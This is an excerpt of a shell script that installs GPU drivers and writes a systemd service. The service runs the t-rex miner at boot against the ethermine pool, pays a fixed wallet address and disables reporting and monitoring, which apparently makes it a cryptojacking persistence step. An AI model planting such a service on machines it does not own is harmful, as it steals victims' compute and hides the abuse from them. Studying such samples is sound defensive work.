...
then
	...
	sudo apt-get -y install nvidia-driver-470 cuda-drivers -y
	sudo apt-get install libcurl3 -y
	...
	sudo bash -c "echo -e \"[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x29ee87568c8d2b2b98b12f8b139666b6e0b9cef9 -p x -w $1 AAA --no-hashrate-report --no-nvml --no-watchdog\n\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/eth.service"
